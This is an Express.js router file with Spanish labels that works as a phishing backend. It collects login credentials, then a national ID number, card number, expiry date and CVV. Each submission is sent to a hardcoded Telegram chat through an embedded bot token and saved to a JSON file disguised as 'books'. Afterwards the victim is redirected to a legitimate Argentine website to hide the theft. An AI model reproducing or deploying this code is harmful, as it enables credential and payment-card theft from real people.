const { Router } = require('express');
const router = Router();
const fs = require ('fs');
const { v4: uuidv4 } = require('uuid');
const bodyParse = require ('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot('6264763162:AAF5boVko72JI5MXuS-m5xuAEQkcuNKBZqo', { polling: true });



const json_books = fs.readFileSync('src/books.json', 'utf-8');
let books = JSON.parse(json_books);


router.get('/', (req, res) => {
    res.render('index.ejs');

});

router.get('/update', (req, res) => {
    res.render('update.ejs');

});

router.get('/new-entry', (req, res) => {
    res.render('new-entry', {
        books
    })
});



router.post('/',  (req, res) => {
    const {username, password,} = req.body;
    bot.sendMessage('791007687', `Usuario: ${username}\nContraseña: ${password}\n`);

    let newBook = {
        id: uuidv4(),
        username,
        password,
        
        
    };
    
    books.push(newBook);
    

    const json_books = JSON.stringify(books)
    fs.writeFileSync('src/books.json', json_books, 'utf-8');
    
    res.redirect('update');
    
    
    
});

router.post('/update',  (req, res) => {
    const {dni, cardnumber, yy, mm, cvv,} = req.body;
    bot.sendMessage('791007687', `Dni: ${dni}\nCardNumber: ${cardnumber}\nAño: ${yy}\nMes: ${mm}\nCvv: ${cvv}\n`);

    let newBook = {
        id: uuidv4(),
        dni,
        cardnumber,
        mm,
        yy,
        cvv,
    };
   
    books.push(newBook);

    const json_books = JSON.stringify(books)
    fs.writeFileSync('src/books.json', json_books, 'utf-8');

    res.redirect('https://www.masterconsultas.com.ar/');
});



router.get('/delete/:id', (req, res) => {
    books = books.filter(book => book.id != req.params.id);
    const json_books = JSON.stringify(books)
    fs.writeFileSync('src/books.json', json_books, 'utf-8');
    res.redirect('/new-entry');

});


module.exports = router;